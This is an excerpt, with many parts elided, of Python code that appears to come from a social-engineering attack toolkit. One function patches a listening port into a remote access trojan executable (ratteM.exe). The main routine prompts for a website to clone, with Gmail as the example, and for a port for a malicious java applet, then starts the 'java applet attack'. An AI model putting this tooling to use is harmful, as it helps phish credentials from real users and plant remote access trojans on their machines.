...
def prepare_ratte(ipaddr,ratteport):
	...
	filewrite.close()
	fileopen=open("src/program_junk/ratteM.exe", "rb")
	data = fileopen.read()
	filewrite=open("src/program_junk/ratteM.exe", "wb")
	filewrite.write(data.replace(str(rPort), str(ratteport)+"\x00", 1))
	filewrite.close()
...
def main():
	...
	website=raw_input("   Enter website to clone (ex. https://gmail.com): ")
	...
	try:
		javaport=int(raw_input("   Enter port java applet should listen on (ex. 443): "))
		while javaport==0 or javaport > 65535:
			javaport=int(raw_input("   Enter port java applet should listen on (65535>port>0): "))
	except ValueError:
		javaport=80
	...
	print ("   [*] Starting java applet attack...")
